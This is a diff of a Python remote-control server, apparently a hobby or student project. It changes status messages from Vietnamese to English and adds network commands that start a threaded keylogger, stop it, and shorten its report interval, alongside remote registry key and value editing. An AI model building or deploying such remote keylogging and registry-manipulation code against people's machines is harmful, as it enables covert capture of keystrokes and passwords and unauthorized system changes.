@@ -104,36 +104,39 @@ class Server(object):
             arr = Str.decode().split(' ')
             brr = arr[1].split('\\',1)
             if registry.deleteValue(mp[brr[0]],brr[1],arr[2]):
-                self.conn.send('Thao tác thành công'.encode())
+                self.conn.send('Completed'.encode())
             else:
-                self.conn.send('Không thành công'.encode())
+                self.conn.send('Failure'.encode())
         elif Str.decode().find('CREATEKEY')!=-1:
             print(Str.decode())
             arr = Str.decode().split(' ')
             if registry.createKey(arr[1])==True:
-                self.conn.send('Thao tác thành công'.encode())
+                self.conn.send('Completed'.encode())
             else:
-                self.conn.send('Không thành công'.encode())
+                self.conn.send('Failure'.encode())
         elif Str.decode().find('DELETEKEY')!=-1:
             print(Str.decode())
             arr = Str.decode().split(' ')
             if registry.deleteKey(arr[1])==True:
-                self.conn.send('Thao tác thành công'.encode())
+                self.conn.send('Completed'.encode())
             else:
-                self.conn.send('Không thành công'.encode())
+                self.conn.send('Failure'.encode())
         elif Str.decode().find('SETVALUE')!=-1:
             print(Str.decode())
             arr = Str.decode().split('%')
             brr = arr[1].split('\\',1)
             try:
                 if registry.setValue(mp[brr[0]],brr[1],arr[2],arr[3],arr[4]) == True:
-                    self.conn.send('Thao tác thành công'.encode())
+                    self.conn.send('Completed'.encode())
                 else:
-                    self.conn.send('Không thành công'.encode())
+                    self.conn.send('Failure'.encode())
             except:
-                self.conn.send('Không thành công'.encode())
+                self.conn.send('Failure'.encode())
         elif Str.decode() == 'KEYLOG':
-            self.startKeylogging()    
+            bep = threading.Thread(target=self.startKeylogging())
+            bep.start()
+        elif Str.decode() == 'KEYSTOP':
+            self.stopKeylogging()
         else:
             f_bin=open('testing.reg','wb+')
             f_bin.write(Str)
@@ -143,7 +146,7 @@ class Server(object):
                 
 
     #ATTRIBUTES AND METHODS SPECIFICALLY FOR KEYLOGGING:
-    __interval = 20
+    __interval = 5
     __log = ''
     __noch = 0
     def __callback(self, event):
@@ -169,7 +172,11 @@ class Server(object):
     def startKeylogging(self):
         keyboard.on_release(self.__callback)
         self.__report()
-        keyboard.wait()
+        waitKey = threading.Thread(target=keyboard.wait)
+        waitKey.start()
+    #TODO: Unhook
+    def stopKeylogging(self):
+        keyboard.unhook(self.__callback)
     ##################################################################################
     def Close(self):
         s.close()
